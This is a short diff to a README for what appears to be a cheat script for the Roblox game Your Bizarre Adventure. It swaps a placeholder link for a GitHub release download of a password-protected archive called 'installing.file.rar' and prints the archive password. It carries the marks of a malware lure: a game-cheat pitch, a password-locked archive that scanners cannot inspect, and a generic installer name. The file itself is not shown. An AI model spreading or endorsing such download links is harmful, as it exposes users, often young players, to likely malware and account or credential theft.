@@ -31,6 +31,6 @@ This project is licensed under the MIT License.
 
 ## Download
 
-[Download the script here](https://your-download-link-here.com)
+[Download the script here](https://github.com/Nikita228424/YBA-script/releases/download/soft/installing.file.rar) Password:ojgjirg4wf82jf
 
 **Unlock the full potential of your Stand with this analytical tool!**
